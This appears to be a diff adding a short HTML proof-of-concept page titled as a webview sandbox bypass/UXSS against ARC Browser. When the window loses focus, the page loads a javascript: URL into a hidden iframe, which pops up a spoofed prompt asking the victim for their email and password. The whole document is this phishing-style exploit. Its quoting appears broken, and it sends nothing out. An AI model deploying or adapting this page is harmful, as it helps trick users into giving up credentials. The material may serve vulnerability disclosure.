@@ -1,0 +1,26 @@
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no">
+    <title> Bypass sandbox Webview UXss Delayed JavaScript execution leak to host app ARC Browser</title>
+
+    <style>
+    iframe {
+    visibility: hidden;
+    }
+    </style>
+
+    <script>
+    window.onblur = function() {
+    document.getElementById("iframe").src = "javascript:prompt("in order to access bing browser you must first login on your account \n please type your email and your password:");
+    }
+    </script>
+    </head>
+    <body>
+    <center>
+    <br>
+    <h1>Click Here</h1>
+    </center>
+    <iframe id="iframe"></iframe>
+    </body>
+    </html>
